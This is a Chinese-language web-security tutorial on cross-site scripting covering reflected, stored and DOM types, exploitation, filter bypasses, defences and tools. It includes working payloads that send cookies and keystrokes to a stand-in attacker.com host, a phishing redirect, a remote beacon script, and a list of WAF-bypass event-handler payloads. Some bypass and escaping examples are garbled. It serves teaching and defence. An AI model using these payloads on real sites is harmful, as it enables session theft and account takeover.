---
title: "XSS跨站脚本攻击详解"
description: "深入讲解XSS漏洞原理、类型、绕过技巧与实战利用"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞原理", "XSS", "Web安全"]
category: "kb"
severity: "medium"
cve: ""
vul_type: "Cross-Site Scripting"
---

# XSS跨站脚本攻击详解

## 漏洞原理

XSS（Cross-Site Scripting）跨站脚本攻击，核心是**将恶意代码注入到网页中，当其他用户访问该页面时，恶意代码会在其浏览器中执行**。

**本质：** 用户输入被当作HTML/JavaScript执行

```html
<!-- 恶意输入 -->
<script>alert(document.cookie)</script>

<!-- 如果网站直接输出用户输入而不转义 -->
<p>欢迎: <script>alert(document.cookie)</script></p>
<!-- 用户的Cookie将被弹出！-->
```

---

## XSS三种类型

### 1. 反射型XSS（非持久型）

恶意代码**不存储在服务器**，通过URL参数传播。

```html
<!-- URL构造 -->
https://target.com/search?q=<script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- 服务端直接回显用户输入 -->
<a href="/search?q=<script>alert(1)</script>">你搜索的是: <script>alert(1)</script></a>
```

**利用条件：** 需要诱导用户点击恶意链接

### 2. 存储型XSS（持久型）

恶意代码**存储在服务器数据库**，所有访问该页面的用户都会被攻击。

```html
<!-- 在评论区提交 -->
用户名: hacker
评论内容: <script>fetch('http://attacker.com?c='+document.cookie)</script>

<!-- 所有访问该评论页的用户Cookie都会被窃取 -->
```

**常见场景：** 评论/留言板/帖子/用户资料/文件名称

### 3. DOM型XSS

恶意代码**不经过服务器**，完全在客户端JavaScript渲染时触发。

```javascript
// 恶意代码示例
// URL: http://target.com/#<img src=x onerror=alert(1)>
var hash = location.hash;
document.write("<div>" + hash + "</div>");
// hash内容被当作HTML解析，触发onerror
```

---

## XSS高级利用

### 窃取Cookie

```html
<script>
fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

<!-- 配合钓鱼 -->
<script>
document.location='http://attacker.com/fake_login?next='+location.href;
</script>
```

### 键盘记录器

```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key);
}
</script>
```

### XSS盲打（Blind XSS）

利用XSS平台（如XSStrike、BLIND XSS）：

```html
<script src="http://attacker.xss.平台.com/beacon.js"></script>
```

### XSS to RCE（特殊场景）

```html
<!-- CMS后台XSS配合CSRF -->
<script>
fetch('/admin/settings', {
    method: 'POST',
    body: 'cmd=whoami&submit=1'
});
</script>
```

---

## XSS WAF绕过技巧

| 原始 | 绕过方式 | 示例 |
|------|---------|------|
| `<script>` | 大小写混合 | `<ScRiPt>` |
| `onerror` | 换行符 | `onerr\nor=` |
| `alert` | Unicode编码 | `\u0061lert` |
| `src` | 大小写 | `SRC` |
| `<img>` | 其他标签 | `<svg onload=...>` |
| `=` | 全角字符 | `<img src=x ＝alert(1)>` |
| `javascript:` | Tab分隔 | `java\<script\>script:alert(1)` |

```html
<!-- 绕过标签过滤 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 绕过src过滤 -->
<object data="javascript:alert(1)">

<!-- 利用事件绕过 -->
<body/onload=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## 防御方案

```html
<!-- 1. HTML转义 -->
&lt;script&gt;   →  &amp;lt;script&amp;gt;

<!-- 2. HTTPOnly Cookie -->
Set-Cookie: session=xxx; HttpOnly; Secure

<!-- 3. CSP内容安全策略 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">

<!-- 4. X-XSS-Protection -->
X-XSS-Protection: 1; mode=block
```

```javascript
// Node.js 安全处理
const escapeHtml = (str) => str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');

// Python Django
from django.utils.html import escape
safe_text = escape(user_input)
```

---

## XSS工具

| 工具 | 用途 |
|------|------|
| **XSStrike** | XSS自动化检测与WAF绕过 |
| **BeEF** | 浏览器渗透框架 |
| **XSSer** | XSS自动化测试 |
| **BurpSuite Pro** | 专业XSS扫描 |
